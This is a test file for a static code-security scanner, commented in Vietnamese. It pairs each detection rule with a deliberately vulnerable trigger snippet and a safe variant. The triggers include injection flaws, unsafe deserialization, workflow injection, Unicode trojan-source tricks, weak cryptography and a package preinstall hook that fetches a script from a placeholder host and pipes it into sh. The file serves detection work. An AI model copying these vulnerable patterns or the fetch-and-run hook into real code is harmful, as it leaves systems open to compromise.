from __future__ import annotations

import re
from pathlib import Path
from typing import Dict, Tuple

import pytest

from fortress_scan.core.config import Config
from fortress_scan.core.engine import scan_source
from fortress_scan.core.registry import all_rules
from fortress_scan.languages import JAVA, JAVASCRIPT, MANIFEST, PYTHON, SHELL, WORKFLOW

BIDI_OVERRIDE = chr(0x202E)
ZERO_WIDTH_SPACE = chr(0x200B)
CYRILLIC_A = chr(0x0430)
FORM_FEED = chr(0x0C)


def rule_ids(language: str, source: str):
    return [f.rule_id for f in scan_source(source, language, "mau", Config())]


TRIGGERS: Dict[str, Tuple[str, str]] = {
    "FSB-CMD-001": (
        PYTHON,
        "import os\nfrom flask import request\n"
        "def h():\n    os.system('ping ' + request.args.get('h'))\n",
    ),
    "FSB-CMD-002": (
        PYTHON,
        "import subprocess\nfrom flask import request\n"
        "def h():\n    subprocess.run(request.args.get('prog'))\n",
    ),
    "FSB-CMD-003": (
        PYTHON,
        "import os\ndef h(muc_tieu):\n    os.system('ping ' + muc_tieu)\n",
    ),
    "FSB-CMD-004": (
        SHELL,
        "#!/bin/bash\nTARGET=$1\nrsync -a ./dist/ $TARGET\n",
    ),
    "FSB-CI-001": (
        WORKFLOW,
        "on:\n  issue_comment:\n    types: [created]\n"
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        '      - run: echo "${{ github.event.issue.title }}"\n',
    ),
    "FSB-CI-002": (
        WORKFLOW,
        "on: issue_comment\n"
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/github-script@v7\n"
        "        with:\n"
        "          script: |\n"
        '            console.log("${{ github.event.comment.body }}")\n',
    ),
    "FSB-CI-003": (
        WORKFLOW,
        "on: pull_request_target\n"
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "        with:\n"
        "          ref: ${{ github.event.pull_request.head.sha }}\n",
    ),
    "FSB-CI-004": (
        WORKFLOW,
        "on: push\n"
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: ben-thu-ba/setup@v3\n",
    ),
    "FSB-DESER-001": (
        PYTHON,
        "import pickle\nfrom flask import request\n"
        "def h():\n    return pickle.loads(request.get_data())\n",
    ),
    "FSB-DESER-002": (
        PYTHON,
        "import pickle\n"
        "def doc(duong_dan):\n"
        "    with open(duong_dan, 'rb') as f:\n        return pickle.loads(f.read())\n",
    ),
    "FSB-EL-001": (
        JAVA,
        "public class H {\n"
        "  public void run(HttpServletRequest request) {\n"
        '    String q = request.getParameter("q");\n'
        "    parser.parseExpression(q).getValue();\n"
        "  }\n"
        "}\n",
    ),
    "FSB-EXEC-001": (
        PYTHON,
        "from flask import request\ndef h():\n    return eval(request.args.get('e'))\n",
    ),
    "FSB-EXEC-002": (
        PYTHON,
        "def tinh(bieu_thuc):\n    return eval(bieu_thuc)\n",
    ),
    "FSB-HDR-001": (
        PYTHON,
        "from flask import make_response, request\n"
        "def h():\n"
        "    resp = make_response('ok')\n"
        "    resp.headers['X-Trace'] = request.args.get('t')\n"
        "    return resp\n",
    ),
    "FSB-IMPORT-001": (
        PYTHON,
        "import importlib\nfrom flask import request\n"
        "def h():\n    return importlib.import_module(request.args.get('m'))\n",
    ),
    "FSB-IMPORT-002": (
        PYTHON,
        "import importlib\ndef nap(ten):\n    return importlib.import_module(ten)\n",
    ),
    "FSB-LDAP-001": (
        PYTHON,
        "from flask import request\n"
        "def tim(conn):\n"
        "    return conn.search_s('dc=x', 2, '(uid=' + request.args.get('u') + ')')\n",
    ),
    "FSB-NOSQL-001": (
        PYTHON,
        "from flask import request\n"
        "def h(col):\n    return col.find({'$where': request.args.get('f')})\n",
    ),
    "FSB-PATH-001": (
        PYTHON,
        "from flask import request\n"
        "def tai():\n    return open('/data/' + request.args.get('f')).read()\n",
    ),
    "FSB-REDIR-001": (
        PYTHON,
        "from flask import redirect, request\n"
        "def chuyen():\n    return redirect(request.args.get('next'))\n",
    ),
    "FSB-REFL-001": (
        PYTHON,
        "from flask import request\n"
        "def h(doi_tuong):\n    return getattr(doi_tuong, request.args.get('f'))\n",
    ),
    "FSB-SQL-001": (
        PYTHON,
        "from flask import request\n"
        "def h(cursor):\n"
        '    cursor.execute(f"SELECT * FROM users WHERE n = \'{request.args.get(\'n\')}\'")\n',
    ),
    "FSB-SQL-002": (
        PYTHON,
        "def tim(cursor, ma):\n    cursor.execute('SELECT * FROM users WHERE id = ' + ma)\n",
    ),
    "FSB-SSRF-001": (
        PYTHON,
        "import requests\nfrom flask import request\n"
        "def lay():\n    return requests.get(request.args.get('url')).text\n",
    ),
    "FSB-SUP-001": (
        MANIFEST,
        '{\n  "scripts": {\n'
        '    "preinstall": "curl -sSL https://example.invalid/s.sh | sh"\n  }\n}\n',
    ),
    "FSB-SUP-002": (
        MANIFEST,
        '{\n  "scripts": {\n'
        '    "postinstall": "node -e \\"require(\'./x\').run()\\""\n  }\n}\n',
    ),
    "FSB-TMPL-001": (
        PYTHON,
        "from flask import request\nfrom jinja2 import Template\n"
        "def h():\n    return Template(request.args.get('t')).render()\n",
    ),
    "FSB-TMPL-002": (
        PYTHON,
        "from jinja2 import Template\ndef ve(noi_dung):\n    return Template(noi_dung).render()\n",
    ),
    "FSB-UNI-001": (
        PYTHON,
        "duyet = False\n# %s return duyet\n" % BIDI_OVERRIDE,
    ),
    "FSB-UNI-002": (
        PYTHON,
        "def kiem%s_tra(u):\n    return True\n" % ZERO_WIDTH_SPACE,
    ),
    "FSB-UNI-003": (
        PYTHON,
        "m" + CYRILLIC_A + "tkhau = 'admin'\n",
    ),
    "FSB-UNI-004": (
        PYTHON,
        "duyet = False\n# ghi chu%sduyet = True\n" % FORM_FEED,
    ),
    "FSB-XML-001": (
        PYTHON,
        "from lxml import etree\nparser = etree.XMLParser(resolve_entities=True)\n",
    ),
    "FSB-XPATH-001": (
        PYTHON,
        "from flask import request\n"
        "def tim(tree):\n"
        "    return tree.xpath('//user[name=\"' + request.args.get('n') + '\"]')\n",
    ),
    "FSB-XSS-001": (
        JAVASCRIPT,
        "function ve(o, req) {\n  const bio = req.body.bio;\n  o.innerHTML = bio;\n}\n",
    ),
}

SAFE_VARIANTS: Dict[str, Tuple[str, str]] = {
    # Cách GitHub khuyến nghị: giá trị đi vào tiến trình qua môi trường, nên
    # shell không bao giờ nhìn thấy nó ở dạng văn bản script.
    "FSB-CI-001": (
        WORKFLOW,
        "on: issue_comment\n"
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - env:\n          TIEU_DE: ${{ github.event.issue.title }}\n"
        '        run: echo "$TIEU_DE"\n',
    ),
    # `script:` của một action KHÔNG eval nó thì chỉ là dữ liệu.
    "FSB-CI-002": (
        WORKFLOW,
        "on: issue_comment\n"
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: ben-khac/dan-nhan@abcdef0123456789abcdef0123456789abcdef01\n"
        "        with:\n"
        "          script: ${{ github.event.comment.body }}\n",
    ),
    # pull_request thường chạy trong hộp cát: không token ghi, không secret.
    "FSB-CI-003": (
        WORKFLOW,
        "on: pull_request\n"
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "        with:\n"
        "          ref: ${{ github.event.pull_request.head.sha }}\n",
    ),
    "FSB-CI-004": (
        WORKFLOW,
        "on: push\n"
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "      - uses: ben-thu-ba/setup@abcdef0123456789abcdef0123456789abcdef01\n",
    ),
    "FSB-CMD-001": (
        PYTHON,
        "import os\nimport shlex\nfrom flask import request\n"
        "def h():\n    os.system('ping ' + shlex.quote(request.args.get('h')))\n",
    ),
    "FSB-CMD-002": (
        PYTHON,
        "import subprocess\nfrom flask import request\n"
        "def h():\n    subprocess.run(['ping', '-c', '1', '--', request.args.get('h')])\n",
    ),
    "FSB-CMD-003": (
        PYTHON,
        "import os\ndef h():\n    os.system('ping -c 1 localhost')\n",
    ),
    "FSB-CMD-004": (
        SHELL,
        '#!/bin/bash\nTARGET=$1\nrsync -a ./dist/ "$TARGET"\n',
    ),
    "FSB-DESER-001": (
        PYTHON,
        "import json\nfrom flask import request\n"
        "def h():\n    return json.loads(request.get_data())\n",
    ),
    "FSB-DESER-002": (
        PYTHON,
        "import json\n"
        "def doc(duong_dan):\n"
        "    with open(duong_dan) as f:\n        return json.loads(f.read())\n",
    ),
    "FSB-EL-001": (
        JAVA,
        "public class H {\n"
        "  public void run(HttpServletRequest request) {\n"
        '    Expression e = parser.parseExpression("name");\n'
        "    String v = (String) e.getValue();\n"
        "  }\n"
        "}\n",
    ),
    "FSB-EXEC-001": (
        PYTHON,
        "from flask import request\ndef h():\n    return int(request.args.get('n')) + 1\n",
    ),
    "FSB-EXEC-002": (
        PYTHON,
        "def tinh():\n    return eval('1 + 1')\n",
    ),
    "FSB-HDR-001": (
        PYTHON,
        "import re\nfrom flask import make_response, request\n"
        "def h():\n"
        "    token = request.args.get('t')\n"
        "    if re.fullmatch(r'[A-Za-z0-9]+', token):\n"
        "        resp = make_response('ok')\n"
        "        resp.headers['X-Trace'] = token\n"
        "        return resp\n"
        "    return 'sai dinh dang', 400\n",
    ),
    "FSB-IMPORT-001": (
        PYTHON,
        "import importlib\nfrom flask import request\n"
        "CHO_PHEP = {'json': 'json', 'csv': 'csv'}\n"
        "def h():\n    return importlib.import_module(CHO_PHEP[request.args.get('m')])\n",
    ),
    "FSB-IMPORT-002": (
        PYTHON,
        "import importlib\ndef nap():\n    return importlib.import_module('json')\n",
    ),
    "FSB-LDAP-001": (
        PYTHON,
        "import ldap.filter\nfrom flask import request\n"
        "def tim(conn):\n"
        "    loc = '(uid=' + ldap.filter.escape_filter_chars(request.args.get('u')) + ')'\n"
        "    return conn.search_s('dc=x', 2, loc)\n",
    ),
    "FSB-NOSQL-001": (
        PYTHON,
        "from flask import request\n"
        "def h(col):\n    return col.find({'ten': str(request.args.get('f'))})\n",
    ),
    "FSB-PATH-001": (
        PYTHON,
        "import os\nfrom flask import request\n"
        "def tai():\n"
        "    ten = os.path.basename(request.args.get('f'))\n"
        "    return open(os.path.join('/data', ten)).read()\n",
    ),
    "FSB-REDIR-001": (
        PYTHON,
        "from flask import redirect, request\n"
        "DUONG_DAN_CHO_PHEP = {'/home', '/about'}\n"
        "def chuyen():\n"
        "    den = request.args.get('next')\n"
        "    if den in DUONG_DAN_CHO_PHEP:\n"
        "        return redirect(den)\n"
        "    return redirect('/home')\n",
    ),
    "FSB-REFL-001": (
        PYTHON,
        "from flask import request\n"
        "CHO_PHEP = {'ham_a': 1, 'ham_b': 2}\n"
        "def h(doi_tuong):\n"
        "    ten = request.args.get('f')\n"
        "    if ten in CHO_PHEP:\n"
        "        return getattr(doi_tuong, ten)\n"
        "    raise ValueError('ten khong hop le')\n",
    ),
    "FSB-SQL-001": (
        PYTHON,
        "from flask import request\n"
        "def h(cursor):\n"
        "    cursor.execute('SELECT * FROM users WHERE n = ?', (request.args.get('n'),))\n",
    ),
    "FSB-SQL-002": (
        PYTHON,
        "def tim(cursor, ma):\n"
        "    cursor.execute('SELECT * FROM users WHERE id = ?', (ma,))\n",
    ),
    "FSB-SSRF-001": (
        PYTHON,
        "import requests\nfrom flask import request\nfrom urllib.parse import urlparse\n"
        "MIEN_CHO_PHEP = {'example.com', 'api.example.com'}\n"
        "def lay():\n"
        "    host = urlparse(request.args.get('url')).hostname\n"
        "    if host in MIEN_CHO_PHEP:\n"
        "        return requests.get('https://' + host).text\n"
        "    raise ValueError('mien khong hop le')\n",
    ),
    "FSB-SUP-001": (
        MANIFEST,
        '{\n  "scripts": {\n    "build": "tsc --build",\n    "test": "jest"\n  }\n}\n',
    ),
    "FSB-SUP-002": (
        MANIFEST,
        '{\n  "scripts": {\n    "postinstall": "node scripts/setup.js"\n  }\n}\n',
    ),
    "FSB-TMPL-001": (
        PYTHON,
        "from flask import request, render_template\n"
        "def h():\n    return render_template('trang.html', ten=request.args.get('t'))\n",
    ),
    "FSB-TMPL-002": (
        PYTHON,
        "from jinja2 import Template\ndef ve():\n    return Template('xin chao').render()\n",
    ),
    "FSB-UNI-001": (PYTHON, "duyet = False\n# return duyet\n"),
    "FSB-UNI-002": (PYTHON, "def kiem_tra(u):\n    return True\n"),
    "FSB-UNI-003": (PYTHON, "matkhau = 'admin'\n"),
    "FSB-UNI-004": (PYTHON, "duyet = False\n# ghi chu\tduyet = True\n"),
    "FSB-XML-001": (
        PYTHON,
        "from lxml import etree\nparser = etree.XMLParser(resolve_entities=False)\n",
    ),
    "FSB-XPATH-001": (
        PYTHON,
        "from flask import request\n"
        "def tim(tree):\n"
        "    return tree.xpath('//user[name=$n]', n=request.args.get('n'))\n",
    ),
    "FSB-XSS-001": (
        JAVASCRIPT,
        "function ve(o, req) {\n  const bio = req.body.bio;\n  o.textContent = bio;\n}\n",
    ),
}


# Điểm yếu không cần nguồn bẩn: mật mã, TLS, secret. Mẫu chi tiết cho từng ngôn
# ngữ nằm ở tests/test_weakness_crypto.py; đây chỉ là một cặp cho mỗi rule.
TRIGGERS.update(
    {
        "FSB-CRYPTO-001": (
            PYTHON,
            "import hashlib\ndef sig(secret, body):\n    return hashlib.md5(secret + body).hexdigest()\n",
        ),
        "FSB-CRYPTO-002": (
            PYTHON,
            "import hashlib\ndef store(password):\n    return hashlib.sha256(password.encode()).hexdigest()\n",
        ),
        "FSB-CRYPTO-003": (PYTHON, "from Crypto.Cipher import DES\nc = DES.new(key, DES.MODE_CBC, iv)\n"),
        "FSB-CRYPTO-004": (
            JAVA,
            "class A { void f() throws Exception { Cipher c = Cipher.getInstance(\"AES\"); } }\n",
        ),
        "FSB-CRYPTO-005": (
            JAVASCRIPT,
            "const c = crypto.createCipheriv('aes-256-gcm', key, 'fixednonce12');\n",
        ),
        "FSB-CRYPTO-006": (JAVASCRIPT, "const t = jwt.sign({ sub: 1 }, 'jwt-signing-secret');\n"),
        "FSB-CRYPTO-007": (
            PYTHON,
            "import random\ntoken = ''.join(random.choice('abc') for _ in range(32))\n",
        ),
        "FSB-CRYPTO-008": (PYTHON, "from Crypto.PublicKey import RSA\nk = RSA.generate(1024)\n"),
        "FSB-TLS-001": (PYTHON, "import requests\nr = requests.get('https://x', verify=False)\n"),
        "FSB-SECRET-001": (PYTHON, "DB_PASSWORD = 'S3cr3t!Pass2024'\n"),
    }
)

SAFE_VARIANTS.update(
    {
        # ETag: băm nội dung tệp, không phải bí mật.
        "FSB-CRYPTO-001": (
            PYTHON,
            "import hashlib\ndef etag(body):\n    return hashlib.md5(body).hexdigest()\n",
        ),
        "FSB-CRYPTO-002": (
            PYTHON,
            "import bcrypt\ndef store(password):\n    return bcrypt.hashpw(password, bcrypt.gensalt())\n",
        ),
        "FSB-CRYPTO-003": (
            PYTHON,
            "from Crypto.Cipher import AES\nc = AES.new(key, AES.MODE_GCM)\n",
        ),
        "FSB-CRYPTO-004": (
            JAVA,
            "class A { void f() throws Exception { Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\"); } }\n",
        ),
        "FSB-CRYPTO-005": (
            JAVASCRIPT,
            "const iv = crypto.randomBytes(12);\nconst c = crypto.createCipheriv('aes-256-gcm', key, iv);\n",
        ),
        "FSB-CRYPTO-006": (JAVASCRIPT, "const t = jwt.sign({ sub: 1 }, process.env.JWT_SECRET);\n"),
        "FSB-CRYPTO-007": (PYTHON, "import secrets\ntoken = secrets.token_urlsafe(32)\n"),
        "FSB-CRYPTO-008": (PYTHON, "from Crypto.PublicKey import RSA\nk = RSA.generate(3072)\n"),
        "FSB-TLS-001": (PYTHON, "import requests\nr = requests.get('https://x', verify='/etc/ca.pem')\n"),
        "FSB-SECRET-001": (PYTHON, "import os\nDB_PASSWORD = os.environ['DB_PASSWORD']\n"),
    }
)


def test_every_registered_rule_has_a_trigger():
    registered = {rule.id for rule in all_rules()}
    missing = sorted(registered - set(TRIGGERS))
    assert missing == [], (
        "cac rule sau chua co mau kich hoat trong TRIGGERS, "
        "moi rule moi bat buoc phai co: %s" % missing
    )


def test_no_trigger_refers_to_an_unknown_rule():
    registered = {rule.id for rule in all_rules()}
    unknown = sorted(set(TRIGGERS) - registered)
    assert unknown == [], "TRIGGERS nhac toi rule khong ton tai: %s" % unknown


@pytest.mark.parametrize("rule_id", sorted(TRIGGERS))
def test_rule_fires_on_its_trigger(rule_id: str):
    language, source = TRIGGERS[rule_id]
    found = rule_ids(language, source)
    assert rule_id in found, "%s khong kich hoat; thuc te nhan duoc: %s" % (rule_id, found)


@pytest.mark.parametrize("rule_id", sorted(SAFE_VARIANTS))
def test_rule_stays_silent_on_safe_variant(rule_id: str):
    language, source = SAFE_VARIANTS[rule_id]
    found = rule_ids(language, source)
    assert rule_id not in found, "%s bao nham tren ma an toan; nhan duoc: %s" % (rule_id, found)


def _readme_text() -> str:
    readme = Path(__file__).resolve().parent.parent / "README.md"
    return readme.read_text(encoding="utf-8")


def test_readme_states_the_real_rule_count():
    """README da tung ghi 26 rule trong khi registry co 27; khoa lai de khong lech nua.

    README bay gio noi con so nay o nhieu cho ( badge, the thong ke, tieu de muc,
    tieu de bieu do ). Kiem TAT CA cung mot luc, vi mot cho lech thi nguoi doc
    van thay con so sai o cho con lai.
    """
    registered = len(list(all_rules()))
    text = _readme_text()
    spots = {
        "badge": r"badge/(\d+)-rule",
        "the thong ke": r"<b>(\d+)</b><br/><sub>rule</sub>",
        "tieu de muc": r"##.*?(\d+) rule trên",
        "chu thich hinh": r'alt="(\d+) rule',
    }
    seen = {}
    for label, pattern in spots.items():
        match = re.search(pattern, text)
        assert match is not None, "README khong con cho '%s' de doi chieu" % label
        seen[label] = int(match.group(1))
    lech = {k: v for k, v in seen.items() if v != registered}
    assert not lech, "registry co %d rule nhung README ghi khac o: %s" % (registered, lech)


def test_readme_lists_every_registered_rule_id():
    text = _readme_text()
    missing = sorted(rule.id for rule in all_rules() if rule.id.rsplit("-", 1)[0] not in text)
    assert missing == [], "README chua nhac toi cac ho rule sau: %s" % missing
